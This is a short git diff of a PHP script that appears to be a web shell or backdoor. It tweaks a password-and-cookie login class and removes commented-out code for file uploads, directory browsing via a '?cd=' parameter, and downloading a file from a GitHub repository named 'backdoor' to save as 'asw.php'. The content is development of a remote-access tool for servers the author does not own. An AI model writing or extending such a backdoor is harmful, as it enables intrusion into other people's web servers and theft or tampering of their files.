@@ -10,7 +10,7 @@ class auth
 		60*60, // 1 minute
 		60*60*1, // 1 hour
 		60*60*24, // 1 day
-		60*60*24*30 // 1 month
+		60*60*24*30, // 1 month
 		60*60*24*30*12 // 1 year
 	];
 	function __construct($password, $expired = null)
@@ -18,7 +18,7 @@ class auth
 		$this->password = $password;
 		$this->cookie = $_COOKIE;
 		$this->post = $_POST;
-		return $this->login($this->password, $this->expired[0]);
+		return $this->login($this->password, $this->expired[2]);
 	}
 	public function displayLogin()
 	{
@@ -378,31 +378,4 @@ class Tools extends Action
 			return false;
 		}
 	}
-
-	/*public function Upload($files)
-	{
-		foreach ($files['error'] as $key => $value) {
-			if ($value === UPLOAD_ERR_OK) {
-				move_uploaded_file($value["tmp_name"][$key], $this->cwd . $value["name"][$key]);
-			}
-		}
-	}*/
 }
-
-// if (isset($_GET['cd'])) {
-// 	new cd($_GET['cd']);
-// }
-// // // $Action = new Action;
-// // // var_dump($Action->download("https://raw.githubusercontent.com/rabbitx1337/backdoor/main/FileSystem.php", "asw.php"));
-// // // die();
-
-// $list = new listFiles;
-
-// // foreach ($list->folder() as $key => $value) {
-// // 	print("<a href='?cd={$value['getPathname']}'>{$value['getName']}</a><br>");
-// // }
-// // foreach ($list->files() as $key => $value) {
-// // 	print($value['getName']."<br>");
-// // }
-// $Action = new Action;
-// var_dump($Action->getUser());
